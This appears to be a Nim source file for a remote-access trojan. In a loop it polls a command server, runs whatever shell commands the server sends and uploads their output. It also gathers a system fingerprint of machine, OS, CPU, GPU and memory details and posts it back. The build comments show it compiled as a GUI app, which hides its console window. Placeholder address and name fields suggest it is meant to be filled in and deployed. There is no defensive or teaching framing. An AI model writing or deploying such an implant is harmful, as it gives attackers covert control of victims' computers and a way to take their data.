
### debage: nim c -d:release -d:danger -d:windows .\main.nim
### release: nim c -d:release -d:danger --app:gui .\main.nim

import sysinfo
import std/os
import puppy
import strutils
import osproc

let your_adress = "http://127.0.0.1:5000"
let name = "your name"

while true:
  var ret = get(your_adress & "/cmd?input=" & name)
  var get = split(ret.body, '-')
  var list = [["getMachineModel: ", getMachineModel()], 
    ["getMachineName: ", getMachineName()], 
    ["getMachineManufacturer: ", getMachineManufacturer()], 
    ["getOsName: ", getOsName()], 
    ["getOsVersion: ", getOsVersion()],
    ["getCpuName: ", getCpuName()],
    ["getCpuGhz: ", $getCpuGhz() & "GHz"],
    ["getCpuManufacturer: ", getCpuManufacturer()],
    ["getNumCpus: ", $getNumCpus()],
    ["getNumTotalCores: ", $getNumTotalCores()],
    ["getTotalMemory: ", $(getTotalMemory().float / 1024 / 1024 / 1024) & "GB"],
    ["getFreeMemory: ", $(getFreeMemory().float / 1024 / 1024 / 1024) & "GB"],
    ["getGpuName: ", getGPUName()],
    ["getGpuDriverVersion: ", getGpuDriverVersion()]]
  if get[0] == "new_name":
    let f = open("info.txt", fmWrite)
    for item in list:
      writeFile("info.txt", $item & "\n")
    close(f)
    var entries: seq[MultipartEntry]
    entries.add MultipartEntry(
      name: "file",
      fileName: "out_file.txt",
      contentType: "file",
      payload: readFile("info.txt")
    )
    let (contentType, body) = encodeMultipart(entries)

    var headers: HttpHeaders
    headers["Content-Type"] = contentType

    let response = post(your_adress & "/upload", headers, body)
  elif get[0] == "0":
      sleep(1000)
  else:
    try:
        var entries: seq[MultipartEntry]
        entries.add MultipartEntry(
          name: "file",
          fileName: "out_file.txt",
          contentType: "file",
          payload: exec_cmd_ex(get[1]).output
        )
        let (contentType, body) = encodeMultipart(entries)

        var headers: HttpHeaders
        headers["Content-Type"] = contentType

        let response = post(your_adress & "/upload", headers, body)
        echo response.body
    except:
        var entries: seq[MultipartEntry]
        entries.add MultipartEntry(
          name: "file",
          fileName: "out_file.txt",
          contentType: "file",
          payload: getCurrentExceptionMsg()
        )
        let (contentType, body) = encodeMultipart(entries)

        var headers: HttpHeaders
        headers["Content-Type"] = contentType

        let response = post(your_adress & "/cmd?input=" & name, headers, body)